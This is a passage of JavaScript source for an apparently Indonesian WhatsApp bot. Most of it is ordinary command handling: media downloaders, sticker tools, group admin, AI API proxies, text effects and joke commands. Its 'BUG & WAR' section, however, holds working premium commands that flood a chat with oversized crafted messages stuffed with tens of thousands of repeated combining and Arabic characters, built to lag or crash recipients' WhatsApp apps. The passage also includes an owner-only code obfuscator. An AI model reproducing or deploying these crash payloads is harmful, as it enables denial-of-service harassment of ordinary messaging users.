joestar.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
m.reply(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./random/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
joestar.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokukhti':
m.reply(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./random/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
joestar.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
m.reply(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./random/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
joestar.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
m.reply(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./random/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
joestar.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
m.reply(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./random/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
joestar.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
m.reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./random/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
joestar.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case "kick":{
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await joestar.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
case "add":{
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di tambahkan')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await joestar.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break
case 'gc': { 
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (args[0] === 'close'){
await joestar.groupSettingUpdate(m.chat, 'announcement').then((res) => m?.reply(`Sukses Menutup Group`)).catch((err) => m?.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await joestar.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m?.reply(`Sukses Membuka Group`)).catch((err) => m?.reply(jsonformat(err)))
} else {
 m?.reply(`Silahkan Ketik ${prefix + command} open/ ${prefix + command} close`)
 }
}
break

// Random Response batas penambahan sc‼️‼️‼️‼️‼️‼️‼️‼️‼️‼️‼️‼️‼️
case 'woi': case 'deck': case 'dick': case 'dek': case 'bocil': case 'esempe': case 'cil': case 'cill': case 'p': {
msgreply(`Harap yang sopan dalam memanggil orang, minimal mengatakan "Assalamu'alaikum warrahmatullahi Wabarakatuh" atau kalian bisa panggil Namanya. Tidak sopan itu, Jika *anda lebih tua* anda mengerti yang namanya etika.

islam: Assalamualaikum
kristen: Shalom
hindu: Swastyastu
buddha: Sotthi Jitu
konghucu: Wei De Dong Tian
Atheis/Gapunya Agama/Orang Gila: ${command}`)
}
break

case 'bug': case 'apa': case 'kenapa': case 'oke': case 'apa': case 'virtex': case 'virteks': case 'virtext': case 'pirtek': case 'pirteks': case 'pirtex': case 'anjay':{
joestar.sendMessage(m.chat, { text: `kenapa?`}, { quoted: qbug })
}
break

case 'shutdown': {
if (!isCreator) return msgreply(mess.owner)
msgreply(`Otsukaresama deshita🖐`)
await sleep(5000)
process.exit()
}
break

case 'enc': {
if (!isCreator) return msgreply(mess.owner)
if (!q) return msgreply(`Contoh ${prefix+command} const fs = require('fs')`)
let meg = await obfus(q)
msgreply(`${meg.result}`)
}
break

//Convert 
case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return msgreply(`Balas Video/Image Dengan Caption ${prefix + command}`)
msgreply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await joestar.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return msgreply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await joestar.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return msgreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'smeme': {
if (!text || !quoted || !/image/.test(mime)) return msgreply(`Balas Image Dengan Caption ${prefix + command} teks 1|teks 2`)
msgreply(mess.wait)
let atas = text.split('|')[0] || '-'
let bawah = text.split('|')[1] || '-'
try {
let dwnld = await joestar.downloadAndSaveMediaMessage(qmsg)
let Bjirka = await uptotelegra(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${Bjirka}`
let pop = await joestar.sendImageAsSticker(m.chat, smeme, m, {
packname: global.packname,
author: global.author
});
fs.unlinkSync(pop)
} catch (error) {
console.error(error)
msgreply('Terjadi kesalahan dalam membuat meme.')
}
}
break

case 'toimage':
case 'toimg': {
if (!/webp/.test(mime)) return msgreply(`Reply sticker dengan caption *${prefix + command}*`)
msgreply(mess.wait)
let media = await joestar.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
joestar.sendMessage(m.chat, {
image: buffer
}, {
quoted: m
})
fs.unlinkSync(ran)
})

}
break
case 'tomp4':
case 'tovideo': {
if (!/webp/.test(mime)) msgreply(`msgreply stiker dengan caption *${prefix + command}*`)
msgreply(mess.wait)
let media = await joestar.downloadAndSaveMediaMessage(qmsg)
let webpToMp4 = await webp2mp4File(media)
await joestar.sendMessage(m.chat, {
video: {
url: webpToMp4.result,
caption: 'Convert Webp To Video'
}
}, {
quoted: m
})
await fs.unlinkSync(media)

}
break
case 'toaud':
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return msgreply(`Kirim/msgreply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
msgreply(mess.wait)
let media = await joestar.downloadMediaMessage(qmsg)
let audio = await toAudio(media, 'mp4')
joestar.sendMessage(m.chat, {
audio: audio,
mimetype: 'audio/mpeg'
}, {
quoted: m
})

}
break

//Openai
case "ai": case "chatgpt": case "openai": {
if (!text) return msgreply (`Example : ${prefix + command} create code html & css for hack NASA`)
var js = await fetch(`https://aemt.me/openai?text=${q}`) 
var json = await js.json()
msgreply(json.result)
}
break
case "prompt-gpt": {
if (!text) return msgreply (`Example : ${prefix + command} buatkan lirik lagu tentang persahabatan dengan genre pop dan panjang 8 baris|# Lirik Lagu,# Genre: Pop,# Panjang: 8 baris,# Tema: Persahabatan`)
iniprompt = q.split("|")[0]
initeks = q.split("|")[1]
var js = await fetch(`https://aemt.me/prompt/gpt?prompt=${iniprompt}&text=${initeks}`) 
var json = await js.json()
msgreply(json.result)
}
break
//Sedang Eror
/*case "gptgo": {
if (!text) return msgreply (`Example : ${prefix + command} Apa itu gpt go?`)
var js = await fetch(`https://aemt.me/gptgo?text=${q}`) 
var json = await js.json()
msgreply(`Berikut Adalah Hasil Dari Gpt-Go \n\n\n\n\n ${json.result}`)
}
break
*/
case "dall-e": {
if (!text) return msgreply (`Example : ${prefix + command} Gunung Dengan Cuaca Hujan`)
imgurl = `https://aemt.me/dalle?text=${q}`
 joestar.sendMessage(m.chat, {
image: {url: imgurl},
caption: 'Nih,Btw klo ngasih ilustrasi yang bener ya'
},{quoted: m })
}
break
case "gpt4": {
if (!text) return msgreply (`Example : ${prefix + command} create code html & css for hack NASA`)
var js = await fetch(`https://aemt.me/gpt4?text=${q}`) 
var json = await js.json()
msgreply(json.result)
}
break

//Owner fitur
case 'addowner': {
if (!isCreator) return 
if (!args[0]) return msgreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895350073878`)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await joestar.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
kontributor.push(prem1)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(kontributor))
msgreply(`${prem1} Sudah menjadi kontributor!!!`)
joestar.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qgeneral })
}
break
case 'delprem':
if (!isCreator) return 
if (!args[0]) return msgreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895350011678`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(prem2)
premium.splice(unp, 1)
fs.writeFileSync('./dtbs/premium.json', JSON.stringify(premium))
msgreply(`${prem2} Tidak lagi premium!!!`)
break

//Scrapper
case "kill":case "pat":case "lick":case "bite":case "yeet":case "bonk":case "wink":case "poke":case "nom":case "slap":case "smile":case "wave":case "blush":case "smug":case "glomp":case "happy":case "dance":case "cringe":case "highfive":case "handhold":
msgreply(mess.wait)
let bugil = `🍻Succes Beb ÙnÚ`
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
joestar.sendMessage(m.chat, {
image: {url: data.url },
caption: '😋 Istri Kartun :3'
},{quoted: qgeneral })
})
break
case 'neko':
case 'waifu':
case 'shinobu':
case 'megumin':{
msgreply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
joestar.sendMessage(m.chat, {
image: {url: data.url },
caption: '😋 Istri Kartun :3'
},{quoted: qgeneral })
})
}
break

case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!q) return msgreply(`Example : ${prefix+command} gen`) 
msgreply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
joestar.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break

//Download
case 'git': case 'gitclone': {
if (!args[0]) return msgreply(`Mana link nya?\nContoh :\n${prefix ? prefix : '.'}${command} https://github.com/YukiShima4/tes`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return msgreply(`Link invalid!!`)
await msgreply(mess.wait)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
joestar.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: qgeneral }).catch((err) => msgreply(err))
} 
break

case 'mediafire': {
if (!text) return msgreply(`Gunakan dengan cara ${prefix + command} *url*`)
msgreply(mess.wait)
let anu = await fetchJson(`https://aemt.me/mediafire?link=${q}`)
let hasdl = anu.result.link
let namafile = anu.result.title
joestar.sendMessage(m.chat, { document: { url: hasdl }, mimetype: '*/*', fileName: namafile }, { quoted: qgeneral })
}
break

case 'igdlmp4': case 'igmp4': {
if (!text) return msgreply(`Gunakan dengan cara ${prefix + command} *url*`)
msgreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/igdl?url=${q}`)
var hassdl = anu.result[0].url
await joestar.sendMessage(m.chat, {
video: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: qgeneral
})
}
break

case 'igdlimage': case 'igimg': {
if (!text) return msgreply(`Gunakan dengan cara ${prefix + command} *url*`)
msgreply(mess.wait)
let hassdl = await fetch(`https://aemt.me/download/igdl?url=${1}`)
let data = await response.json()
let url = data.result[0].url
await joestar.sendMessage(m.chat, { image: { url: url }, caption: 'Succes Sayang UwU' }, { quoted: qgeneral })
}
break

case 'pintmp4': {
if (!text) return msgreply(`Gunakan dengan cara ${prefix + command} *url*`)
msgreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/pindl?url=${q}`)
var hassdl = anu.result.url
await joestar.sendMessage(m.chat, {
video: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: qgeneral
})
}
break

case 'douyindl': {
if (!text) return msgreply(`Gunakan dengan cara ${prefix + command} *url*`)
msgreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/douyin?url=${q}`)
var hassdl = anu.result.url.nowm
await joestar.sendMessage(m.chat, {
video: {
url: hassdl,
caption: 'Succes Sayang UwU'
}
}, {
quoted: qgeneral
})
}
break

case 'ytmp3':
case 'youtubemp3':
case 'youtubeaudio':{
if(!q) return msgreply(`Contoh : ${prefix+command} Link`)
await msgreply(mess.wait)
downloadMp3(text)
}
break
case 'ytmp4':
case 'youtubevideo':
case 'youtubemp4':{
if(!q) return msgreply(`Contoh : ${prefix+command} Link`)
await msgreply(mess.wait)
downloadMp4(text)
}
break
case 'tiktok':
case 'tiktokvideo': 
case 'ttvid': {
if (!text) return msgreply( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return msgreply(`Link Invalid!!`)
await msgreply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
joestar.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: qgeneral })
})
}
break

case 'tiktokmp3':
case 'tiktokaudio': 
case 'ttmp3': {
if (!text) return msgreply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return msgreply(`Link Invalid!!`)
await msgreply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
joestar.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: qgeneral })
})
}
break

case 'play': 
case 'ytaudio':
case 'playmusik':
case 'playmusic': {
if (!q) return msgreply("Kirim perintah judul lagu/link youtube nya bwang")
try {
let rus = await yts(q)
if (rus.all.length == "0") return msgreply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')
try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
try{
var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
} catch(err) {
var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/default.jpg`
}
let inithumb = await getBuffer(thumbnya)
let teks = `
❗ PLAY YOUTUBE ❗

🌤️ Channel : ${res.author.name}
🧑‍💻 Viewers : ${res.views} Kali
🕧 Duration : ${res.timestamp}
🔗 Url : ${res.url}

> \`🄺🄴🄼🄰🅃🄸🄰🄽 😈\`

`
joestar.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: false, 
title: `${res.title}`,
body: `${week} ${calender}`,
mediaType: 2,  
renderLargerThumbnail : true,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}}, image: {url: inithumb},text: teks},{quoted: m})                                        
downloadMp3(`${res.url}`) 
} catch (err){
console.log(err)
msgreply(`Server sedang error`)
}
}
break

// Random
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'cekganteng':
case 'cekcantik':
case 'cekkaya':
case 'lesbicek':
case 'ceklesbi': {
if (!q) return msgreply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var sangek = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
var sange = sangek[Math.floor(Math.random() * sangek.length)]
msgreply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
case 'kapankah': {
if (!q) return msgreply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${prefix + command} Saya Jadi Istrinya Ryo Kun >////<`)
var kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
var kapankah = kapan[Math.floor(Math.random() * kapan.length)]
msgreply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break
case 'wangy': {
if (!text) return msgreply(`Contoh: ${prefix + command} Vyaaa`)
msgreply(`${q} ${q} ${q} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah Wangynya rambut ${q} wangyy aku mau nyiumin aroma wangynya ${q} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus & pat-pat ~~ AAAAAH ${q} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${q} AAAAA LUCCUUUUUUUUUUUUUUU............ ${q} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${q} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${q} gw ... ${q} di laptop ngeliatin gw, ${q} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${q} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${q} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`)
}
break
case 'cekmati': {
if (!text) return msgreply(`Yang Mau Lu Cek Siapa Bego?`)
apipanas = await axios.get(`https://api.agify.io/?name=${q}`)
msgreply(`Nama : ${apipanas.data.name}\n*Mati Pada Umur :* ${apipanas.data.age} Tahun.\n\n\n‼️*Jangan percaya teks diatas, Soalnya mati gada yg tau.Cepet Cepet Tobat Ya Bro*`)
}
break
case 'bagaimana': {
if (!text) return msgreply( `Example : ${prefix + command} cara agar menjadi cewe yang sesuai dengan tipe nya ryo >////<`)
var apa = ['Gatau juga sih', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab Pertanyaan Anda', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Alamak, pusing gweh', 'mending beli eskrim', 'Gimana yeee']
var kah = apa[Math.floor(Math.random() * apa.length)]
msgreply(`Pertanyaan : bisakah ${q}\nJawaban : ${kah}`)
}
break

case 'bisakah': {
if (!text) return msgreply( `Example : ${prefix + command} saya menjadi orang yang cakep seperti ryo`)
var apa = ['Iya', 'Tidak', 'Bisa Jadi', 'sepertinya', 'keknya sih ngga', 'g', 'gatau juga', 'ngga bakal bisa', 'gk']
var kah = apa[Math.floor(Math.random() * apa.length)]
msgreply(`Pertanyaan : bisakah ${q}\nJawaban : ${kah}`)
}
break

case 'apakah': {
if (!text) return msgreply( `Example : ${prefix + command} ryo cakep`)
var apa = ['Iya', 'Tidak', 'Bisa Jadi', 'sepertinya', 'keknya sih iya', 'Betul']
var kah = apa[Math.floor(Math.random() * apa.length)]
msgreply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break

//Audio
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44900*1.18'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
msgreply(mess.wait)
let media = await joestar.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return msgreply(err)
let buff = fs.readFileSync(ran)
joestar.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : qgeneral })
fs.unlinkSync(ran)
})
} else msgreply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
msgreply(e)
}
break

// ❗❗❗ BUG & WAR❗❗❗
// Walaupun Bug Quoted, Tapi Anti Pasaran 😜🤙


case 'bugtroli': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6`)
jumlah = q * 2
for (let i = 0; i < jumlah; i++) {
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "594071395007984",
"orderImage": fakejpg,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": unic.n1 + `ྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷ`.repeat(3106),
"jpegThumbnail": dlapan,
"orderTitle": `⟠ 🅈🄺🄾🅃🄱🄾🅃 々 🄺🄴🄼🄰🅃🄸🄰🄽 😈 ⿻`,
"sellerJid": "0@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: m })
joestar.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break

case 'bgc': {
if (!isGroup) return msgreply(mess.ingroup)
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6`)
jumlah = q * 2
if (!isPremium) return msgreply(mess.premium)
var etc = {
scheduledCallCreationMessage: {
callType: ' E4T MY D1CK ',
scheduledTimestampMs: 0,
title: unic.n4 + '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(10000)
}
}
for (let i = 0; i < jumlah; i++) {
await joestar.relayMessage(m.chat, etc, {})
}
}
break

case 'bgcv2': {
if (!isPremium) return msgreply(mess.premium)
if (!isGroup) return msgreply(mess.ingroup) 
jumlah = q * 2
for (let i = 0; i < jumlah; i++) {
await joestar.sendMessage(m.chat, { text: 'Ngelag Ya 😝. bukan web, bukan hair space🤪', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(10000), serverMessageId: 2 } }}, { quoted: qbug })
}
}
break

case 'bugpc': {
if (!isGroup) return msgreply(mess.ingroup)
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6`)
jumlah = q * 2
if (!isPremium) return msgreply(mess.premium)
var etc = {
scheduledCallCreationMessage: {
callType: ' E4T MY D1CK ',
scheduledTimestampMs: 0,
title: unic.n3 + '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(10000)
}
}
for (let i = 0; i < jumlah; i++) {
joestar.relayMessage(m.chat, etc, {})
}
}
break


case 'bugpcv2': case 'bugteks': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6`)
jumlah = q * 2
for (let i = 0; i < jumlah; i++) {
await joestar.sendMessage(m.chat, { text: 'Ngelag Ya 😝. bukan web, bukan hair space🤪', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(10000), serverMessageId: 2 } }}, { quoted: qbug })
}
}
break

case 'bugiphone': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6`)
jumlah = q * 2
for (let i = 0; i < jumlah; i++) {
